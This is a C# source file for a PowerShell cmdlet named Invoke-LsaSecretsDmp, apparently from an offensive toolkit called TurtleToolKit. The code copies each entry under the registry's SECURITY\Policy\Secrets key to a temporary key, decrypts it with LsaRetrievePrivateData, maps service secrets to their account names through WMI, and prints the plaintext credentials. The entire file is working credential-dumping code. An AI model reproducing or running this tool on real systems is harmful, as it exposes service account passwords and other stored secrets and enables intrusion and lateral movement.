using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management;
using Microsoft.Win32;
using TurtleToolKitManaged;


namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "LsaSecretsDmp")]  // <- seeting cmdlet name and verbs
    [Alias("INVLSADMP")]                        //<- cmdlet alias
    public class InvokeLsaDump : Cmdlet
    {
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            string[] keys = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets\").GetSubKeyNames();
            foreach (string user in keys)
            {
                var userSecretKey = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets\" + user);
                var destFakeKey = Registry.LocalMachine.CreateSubKey(@"SECURITY\Policy\Secrets\" + "Turtle");
                userSecretKey.CopyReg(destFakeKey);
                ExecuteDumpLsaSecrets("Turtle", user);
            }
            Registry.LocalMachine.DeleteSubKeyTree(@"SECURITY\Policy\Secrets\" + "Turtle", true);
            return;
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }


        // main function that executes LsaSecretsDecrypt
        public static bool ExecuteDumpLsaSecrets(string key, string usrName)
        {
            // create registry key to copy
            var myKey = key;
            // attributes
            Win32.LSA_OBJECT_ATTRIBUTES objAttributes = new Win32.LSA_OBJECT_ATTRIBUTES();
            objAttributes.Length = 0;
            objAttributes.RootDirectory = IntPtr.Zero;
            objAttributes.Attributes = 0;
            objAttributes.SecurityDescriptor = IntPtr.Zero;
            objAttributes.SecurityQualityOfService = IntPtr.Zero;

            // localSystem
            Win32.LSA_UNICODE_STRING localSystem = new Win32.LSA_UNICODE_STRING();
            localSystem.Buffer = IntPtr.Zero;
            localSystem.Length = 0;
            localSystem.MaximumLength = 0;

            // secret name

            Win32.LSA_UNICODE_STRING secretName = new Win32.LSA_UNICODE_STRING();
            secretName.Buffer = Marshal.StringToHGlobalUni(myKey);
            secretName.Length = (ushort)(myKey.Length * UnicodeEncoding.CharSize);
            secretName.MaximumLength = (ushort)((myKey.Length + 1) * UnicodeEncoding.CharSize);

            // lsa policy handle
            IntPtr lsaPolicyHandle;
            Win32.LSA_AccessPolicy access = Win32.LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION;
            var lsaPolicyOpenHandle = Win32.LsaOpenPolicy(ref localSystem, ref objAttributes, (uint)access, out lsaPolicyHandle);
            if (lsaPolicyOpenHandle != 0)
            {
                Console.WriteLine("lsa open policy error -> {0}", lsaPolicyOpenHandle);
                return false;
            }
            // get private data
            IntPtr privData = IntPtr.Zero;
            var ntsResult = Win32.LsaRetrievePrivateData(lsaPolicyHandle, ref secretName, out privData);
            var lsaClose = Win32.LsaClose(lsaPolicyHandle);
            var lsaNtStatusError = Win32.LsaNtStatusToWinError(ntsResult);
            if (lsaNtStatusError != 0)
            {
                Console.WriteLine("::: {0} -> lsaNtStatusToWinError {1}", key, lsaNtStatusError);
                return false;
            }

            Win32.LSA_UNICODE_STRING lusSecretData = (Win32.LSA_UNICODE_STRING)Marshal.PtrToStructure(privData, typeof(Win32.LSA_UNICODE_STRING));
            string value = "";
            try
            {
                value = Marshal.PtrToStringAuto(lusSecretData.Buffer);
                value = value.Substring(0, (lusSecretData.Length / 2));
            }
            catch (Exception)
            {
                //Console.WriteLine(e);
                value = "";
                return false;
            }
            if (usrName.StartsWith("_SC_"))
            {
                string tmp = usrName.Replace("_SC_", "");
                SelectQuery sQuery = new SelectQuery(string.Format("select startname from Win32_Service where name = '{0}'", tmp)); // where name = '{0}'", "MCShield.exe"));
                using (ManagementObjectSearcher mgmtSearcher = new ManagementObjectSearcher(sQuery))
                {
                    foreach (ManagementObject service in mgmtSearcher.Get())
                    {
                        usrName = service["startname"].ToString();
                    }
                }
            }
            if (lusSecretData.Length == 0)
            {
                Console.WriteLine("::: {0} -> NO SECRET FOUND :::", usrName, value);
                return true;
            }
            Console.WriteLine("::: {0} -> {1} :::", usrName, value);
            return true;
        }

    }

    // class just for copy reg function,,, extends RegistryKey Class
    public static class regExtension
    {
        public static void CopyReg(this RegistryKey src, RegistryKey dest)
        {
            foreach (var name in src.GetValueNames())
            {
                dest.SetValue(name, src.GetValue(name), src.GetValueKind(name));
            }
            foreach (var name in src.GetSubKeyNames())
            {
                using (var srcSubKey = src.OpenSubKey(name, false))
                {
                    var dstSubKey = dest.CreateSubKey(name);
                    srcSubKey.CopyReg(dstSubKey);
                }
            }
        }
    }
}
